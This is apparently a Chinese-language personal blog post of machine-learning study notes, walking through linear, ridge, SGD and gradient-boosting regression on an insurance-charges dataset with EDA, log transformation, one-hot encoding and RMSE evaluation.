目的：发现数据长什么样、哪里脏、哪里怪、哪里藏着有用的信号，从而为后续的特征工程、模型选择、甚至业务决策提供直觉和依据 发现charges出现右偏问题，通过特征工程中数值变换的取对数手段进行处理 1 2 3 4 # 观察数据结构信息 print(data.info()) # 结果显示数据质量较好，无缺失值 print(data.describe()) \u0026lt;class 'pandas.core.frame.DataFrame'\u0026gt; RangeIndex: 1338 entries, 0 to 1337 Data columns (total 7 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 age 1338 non-null int64 1 sex 1338 non-null object 2 bmi 1338 non-null float64 3 children 1338 non-null int64 4 smoker 1338 non-null object 5 region 1338 non-null object 6 charges 1338 non-null float64 dtypes: float64(2), int64(2), object(3) memory usage: 73.3+ KB None age bmi children charges count 1338.000000 1338.000000 1338.000000 1338.000000 mean 39.207025 30.663397 1.094918 13270.422265 std 14.049960 6.098187 1.205493 12110.011237 min 18.000000 15.960000 0.000000 1121.873900 25% 27.000000 26.296250 0.000000 4740.287150 50% 39.000000 30.400000 1.000000 9382.033000 75% 51.000000 34.693750 2.000000 16639.912515 max 64.000000 53.130000 5.000000 63770.428010 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 # 观察数据分布 import matplotlib.pyplot as plt # %matplotlib inline plt.rcParams[\u0026#39;font.family\u0026#39;] = \u0026#39;sans-serif\u0026#39; # 1. 启用 sans-serif 列表 plt.rcParams[\u0026#39;font.sans-serif\u0026#39;] = [\u0026#39;SimHei\u0026#39;] # 2. 把 SimHei 放在最前 plt.rcParams[\u0026#39;axes.unicode_minus\u0026#39;] = False # 3. 让负号正常显示（可选） plt.figure(figsize=(10, 8)) # 设置画布大小 plt.subplot(2, 2, 1) # 第一个子图 plt.hist(data[\u0026#39;age\u0026#39;], bins=20, color=\u0026#39;lightgreen\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;Ages\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of Age\u0026#39;) plt.subplot(2, 2, 2) # 第二个子图 plt.hist(data[\u0026#39;bmi\u0026#39;], bins=25, color=\u0026#39;salmon\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;BMI\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of BMI\u0026#39;) plt.subplot(2, 2, 3) # 第三个子图 plt.hist(data[\u0026#39;children\u0026#39;], bins=6, color=\u0026#39;gold\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;Children\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of Children\u0026#39;) ax_charges=plt.subplot(2, 2, 4) # 第四个子图 plt.hist(data[\u0026#39;charges\u0026#39;], bins=30, color=\u0026#39;skyblue\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.xlabel(\u0026#39;Charges\u0026#39;) plt.ylabel(\u0026#39;Count\u0026#39;) plt.title(\u0026#39;Distribution of Charges\u0026#39;) ax_charges.text( 0.95,0.95, # 百分比坐标 \u0026#39;右偏（positively skewed / right-skewed）\\n指分布的尾部向右（值大的一侧）拖得很长\\n均值 \u0026gt; 中位数\u0026#39;, transform=ax_charges.transAxes, # 用子图的坐标系 va=\u0026#39;top\u0026#39;,ha=\u0026#39;right\u0026#39;, # 文本框基准点选取 fontsize = 10, bbox=dict( boxstyle=\u0026#39;round,pad=0.3\u0026#39;, facecolor=(0.9,0.9,0.9), alpha=0.5, ) ) plt.tight_layout() # 自动调整间距 plt.show() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 压缩优化异常标签值 ax = plt.subplot(1, 1, 1) ax.text( 0.55,0.95, # 百分比坐标 \u0026#39;通过ln函数将原右偏拖尾压缩，\\n使结果更接近正态\u0026#39;, transform=ax.transAxes, # 用子图的坐标系 va=\u0026#39;top\u0026#39;,ha=\u0026#39;left\u0026#39;, # 文本框基准点选取 fontsize = 10, bbox=dict( boxstyle=\u0026#39;round,pad=0.3\u0026#39;, facecolor=(0.9,0.9,0.9), alpha=0.5, ) ) plt.hist(np.log1p(data[\u0026#39;charges\u0026#39;]),bins=20, color=\u0026#39;skyblue\u0026#39;, edgecolor=\u0026#39;k\u0026#39;) plt.title(\u0026#39;log of \\\u0026#39;charges\\\u0026#39;\u0026#39;) plt.show() # 增加标签值压缩列 data[\u0026#39;log_charges\u0026#39;]=np.log1p(data[\u0026#39;charges\u0026#39;]) data.head(6) age sex bmi children smoker region charges log_charges 0 19 female 27.900 0 yes southwest 16884.92400 9.734236 1 18 male 33.770 1 no southeast 1725.55230 7.453882 2 28 male 33.000 3 no southeast 4449.46200 8.400763 3 33 male 22.705 0 no northwest 21984.47061 9.998137 4 32 male 28.880 0 no northwest 3866.85520 8.260455 5 31 female 25.740 0 no southeast 3756.62160 8.231541 3、特征工程 类别：缺失值处理/数值变换/类别编码/高维稀疏/非线性交叉/时序\u0026amp;序列/业务先验 类别编码 — One-Hot编码：对某个特征从“分类”到“向量”的变化过程，例如： 若简单地将“男”/“女”，编码为0/1，模型会误以为“女”\u0026gt;“男”，把颜色当成连续量，学到错误的序关系 将“男”/“女”编码为二维向量 $(0,1)$ 和 $(1,0)$ 将本项目中的region特征中的southeast、southwest、northeast、northwest编码为$(1,0,0,0)，(0,1,0,0)，(0,0,1,0)，(0,0,0,1)$ 1 2 3 # 进行 One-Hot编码 data = pd.get_dummies(data,dtype=int) data.head(6) age bmi children charges log_charges sex_female sex_male smoker_no smoker_yes region_northeast region_northwest region_southeast region_southwest 0 19 27.900 0 16884.92400 9.734236 1 0 0 1 0 0 0 1 1 18 33.770 1 1725.55230 7.453882 0 1 1 0 0 0 1 0 2 28 33.000 3 4449.46200 8.400763 0 1 1 0 0 0 1 0 3 33 22.705 0 21984.47061 9.998137 0 1 1 0 0 1 0 0 4 32 28.880 0 3866.85520 8.260455 0 1 1 0 0 1 0 0 5 31 25.740 0 3756.62160 8.231541 1 0 1 0 0 0 1 0 1 2 3 4 5 6 7 8 9 # 取出样本及标签值 x = data.drop(columns=[\u0026#39;charges\u0026#39;,\u0026#39;log_charges\u0026#39;]) y = data[\u0026#39;log_charges\u0026#39;] # 填充空值 x.fillna(0,inplace=True) y.fillna(0,inplace=True) x.head() age bmi children sex_female sex_male smoker_no smoker_yes region_northeast region_northwest region_southeast region_southwest 0 19 27.900 0 1 0 0 1 0 0 0 1 1 18 33.770 1 0 1 1 0 0 0 1 0 2 28 33.000 3 0 1 1 0 0 0 1 0 3 33 22.705 0 0 1 1 0 0 1 0 0 4 32 28.880 0 0 1 1 0 0 1 0 0 1 2 3 4 5 6 # 划分训练集与测试集 from sklearn.model_selection import train_test_split x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.3) print(x.shape,y.shape) print(x_train.shape,y_train.shape) print(x_test.shape,y_test.shape) (1338, 11) (1338,) (936, 11) (936,) (402, 11) (402,) 1 2 3 4 5 6 7 8 9 # 归一化 from sklearn.preprocessing import StandardScaler x_scaler = StandardScaler( copy=True, # 非原地更改 with_mean=True, # 先减去平均值 with_std=True, # 除以标准差 ).fit(x_train) # 用测试集数据训练出均值和标准差 x_train_scaled = x_scaler.transform(x_train) x_test_scaled = x_scaler.transform(x_test) 1 2 3 4 5 6 7 8 # 多项式升维以拟合非线性特征 from sklearn.preprocessing import PolynomialFeatures poly_features = PolynomialFeatures( degree = 1, include_bias=False ) x_train_scaled = poly_features.fit_transform(x_train_scaled) x_test_scaled = poly_features.fit_transform(x_test_scaled) 4、模型训练 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from sklearn.linear_model import LinearRegression from sklearn.linear_model import Ridge from sklearn.linear_model import SGDRegressor # 线性回归 lin_reg = LinearRegression() lin_reg.fit(x_train_scaled,y_train) y_train_predict_lin = lin_reg.predict(x_train_scaled) y_test_predict_lin = lin_reg.predict(x_test_scaled) # 岭回归 rid_reg = Ridge() rid_reg.fit(x_train_scaled,y_train) y_train_predict_rid = rid_reg.predict(x_train_scaled) y_test_predict_rid = rid_reg.predict(x_test_scaled) # 随机梯度下降 sgd_reg = SGDRegressor() sgd_reg.fit(x_train_scaled,y_train) y_train_predict_sgd = sgd_reg.predict(x_train_scaled) y_test_predict_sgd = sgd_reg.predict(x_test_scaled) 5、模型评估 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from sklearn.metrics import mean_squared_error print( \u0026#34;LinearRegression(Train / Test): \u0026#34;, np.sqrt(mean_squared_error(y_train,y_train_predict_lin)), np.sqrt(mean_squared_error(y_test,y_test_predict_lin)) ) print( \u0026#34;RidgeRegression(Train / Test): \u0026#34;, np.sqrt(mean_squared_error(y_train,y_train_predict_rid)), np.sqrt(mean_squared_error(y_test,y_test_predict_rid)) ) print( \u0026#34;SGDRegression(Train / Test): \u0026#34;, np.sqrt(mean_squared_error(y_train,y_train_predict_sgd)), np.sqrt(mean_squared_error(y_test,y_test_predict_sgd)) ) LinearRegression(Train / Test): 0.44905273756975034 0.43211955383967054 RidgeRegression(Train / Test): 0.44905315842354915 0.4321996372029468 SGDRegression(Train / Test): 0.449286159412961 0.43308751362633735 6、进阶 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 import numpy as np import pandas as pd import matplotlib.pyplot as plt import seaborn as sns from sklearn.preprocessing import PolynomialFeatures from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression from sklearn.linear_model import Ridge from sklearn.ensemble import GradientBoostingRegressor from sklearn.metrics import mean_squared_error from sklearn.preprocessing import StandardScaler # 数据读取 data = pd.read_csv(\u0026#39;./Dataset/1_Insurance_Expense_Forecast/insurance.csv\u0026#39;) # EDA # 如果对于某个特征对预测值几乎无影响，则可忽略（降噪） data[\u0026#39;charges\u0026#39;] = np.log1p(data[\u0026#39;charges\u0026#39;]) print(data.head()) print(data.info()) print(data.describe()) ax = plt.subplot(2,2,1) plt.title(\u0026#39;sex\u0026#39;) sns.kdeplot(data.loc[data.sex==\u0026#39;male\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;male\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.sex==\u0026#39;female\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;female\u0026#39;, ax=ax) plt.legend() ax = plt.subplot(2,2,2) plt.title(\u0026#39;smoke\u0026#39;) sns.kdeplot(data.loc[data.smoker==\u0026#39;yes\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;smoker_yes\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.smoker==\u0026#39;no\u0026#39;,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;smoker_no\u0026#39;, ax=ax) plt.legend() ax = plt.subplot(2,2,3) plt.title(\u0026#39;region\u0026#39;) sns.kdeplot(data.loc[data.region==\u0026#39;southeast\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;southeast\u0026#39;,ax=ax) sns.kdeplot(data.loc[data.region==\u0026#39;southwest\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;southwest\u0026#39;,ax=ax) sns.kdeplot(data.loc[data.region==\u0026#39;northeast\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;northeast\u0026#39;,ax=ax) sns.kdeplot(data.loc[data.region==\u0026#39;northwest\u0026#39;,\u0026#39;charges\u0026#39;], fill=True,label=\u0026#39;northwest\u0026#39;,ax=ax) plt.legend() ax = plt.subplot(2,2,4) plt.title(\u0026#39;children\u0026#39;) sns.kdeplot(data.loc[data.children==0,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_0\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==1,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_1\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==2,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_2\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==3,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_3\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==4,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_4\u0026#39;, ax=ax) sns.kdeplot(data.loc[data.children==5,\u0026#39;charges\u0026#39;], fill=True, label=\u0026#39;children_5\u0026#39;, ax=ax) plt.legend() plt.tight_layout() plt.show() # 特征工程 data = data.drop([\u0026#39;region\u0026#39;,\u0026#39;sex\u0026#39;],axis=1) # 删除无用特征 # 特征离散化 def discretization(df,bmi=30,child=0): df[\u0026#39;bmi\u0026#39;]=\u0026#39;over\u0026#39; if df[\u0026#39;bmi\u0026#39;]\u0026gt;=bmi else \u0026#39;under\u0026#39; df[\u0026#39;children\u0026#39;] = \u0026#39;no\u0026#39; if df[\u0026#39;children\u0026#39;] == child else \u0026#39;yes\u0026#39; return df data = data.apply(discretization,axis=1,args=(30,0)) print(data.head()) # one-hot 编码 data = pd.get_dummies(data) # 解决右偏问题 print(data.head()) # 样本获取与空值填充 x = data.drop(\u0026#39;charges\u0026#39;,axis=1) y = data[\u0026#39;charges\u0026#39;] x.fillna(0,inplace=True) y.fillna(0,inplace=True) print(x.head()) print(y.head()) # 模型训练 # 划分 x_train,x_test,y_train,y_test = train_test_split(x,y,test_size=0.3) # # 归一化 # x_scaler = StandardScaler().fit(x_train) # x_train = x_scaler.transform(x_train) # 升维 poly_featrues = PolynomialFeatures(degree=2,include_bias=False) x_train_poly = poly_features.fit_transform(x_train) # 训练 reg_lin = LinearRegression() reg_lin.fit(x_train_poly,y_train) reg_rid = Ridge() reg_rid.fit(x_train_poly,y_train) reg_gra = GradientBoostingRegressor() reg_gra.fit(x_train_poly,y_train) # 测试集预测 # # 归一化 # x_test = x_scaler.transform(x_test) # 升维 x_test_poly = poly_features.fit_transform(x_test) # 预测 y_test_pre_lin = reg_lin.predict(x_test_poly) y_test_pre_rid = reg_rid.predict(x_test_poly) y_test_pre_gra = reg_gra.predict(x_test_poly) # 模型评估 print( \u0026#34;LinearRegression: \u0026#34;, np.sqrt(mean_squared_error(y_test,y_test_pre_lin)) ) print( \u0026#34;RidgeRegression: \u0026#34;, np.sqrt(mean_squared_error(y_test,y_test_pre_rid)) ) print( \u0026#34;GradientBoostingRegressor: \u0026#34;, np.sqrt(mean_squared_error(y_test,y_test_pre_gra)) ) age sex bmi children smoker region charges 0 19 female 27.900 0 yes southwest 9.734236 1 18 male 33.770 1 no southeast 7.453882 2 28 male 33.000 3 no southeast 8.400763 3 33 male 22.705 0 no northwest 9.998137 4 32 male 28.880 0 no northwest 8.260455 \u0026lt;class 'pandas.core.frame.DataFrame'\u0026gt; RangeIndex: 1338 entries, 0 to 1337 Data columns (total 7 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 age 1338 non-null int64 1 sex 1338 non-null object 2 bmi 1338 non-null float64 3 children 1338 non-null int64 4 smoker 1338 non-null object 5 region 1338 non-null object 6 charges 1338 non-null float64 dtypes: float64(2), int64(2), object(3) memory usage: 73.3+ KB None age bmi children charges count 1338.000000 1338.000000 1338.000000 1338.000000 mean 39.207025 30.663397 1.094918 9.098828 std 14.049960 6.098187 1.205493 0.919379 min 18.000000 15.960000 0.000000 7.023647 25% 27.000000 26.296250 0.000000 8.464064 50% 39.000000 30.400000 1.000000 9.146658 75% 51.000000 34.693750 2.000000 9.719618 max 64.000000 53.130000 5.000000 11.063061 age bmi children smoker charges 0 19 under no yes 9.734236 1 18 over yes no 7.453882 2 28 over yes no 8.400763 3 33 under no no 9.998137 4 32 under no no 8.260455 age charges bmi_over bmi_under children_no children_yes smoker_no \\ 0 19 9.734236 False True True False False 1 18 7.453882 True False False True True 2 28 8.400763 True False False True True 3 33 9.998137 False True True False True 4 32 8.260455 False True True False True smoker_yes 0 True 1 False 2 False 3 False 4 False age bmi_over bmi_under children_no children_yes smoker_no smoker_yes 0 19 False True True False False True 1 18 True False False True True False 2 28 True False False True True False 3 33 False True True False True False 4 32 False True True False True False 0 9.734236 1 7.453882 2 8.400763 3 9.998137 4 8.260455 Name: charges, dtype: float64 LinearRegression: 0.41171540130927264 RidgeRegression: 0.4119283802418486 GradientBoostingRegressor: 0.3163566171772987 ","date":"2025-12-02T13:16:53+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/output_45_1_hu_81ee81afe7fabe02.jpg","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/","title":"机器学习-线性回归"}]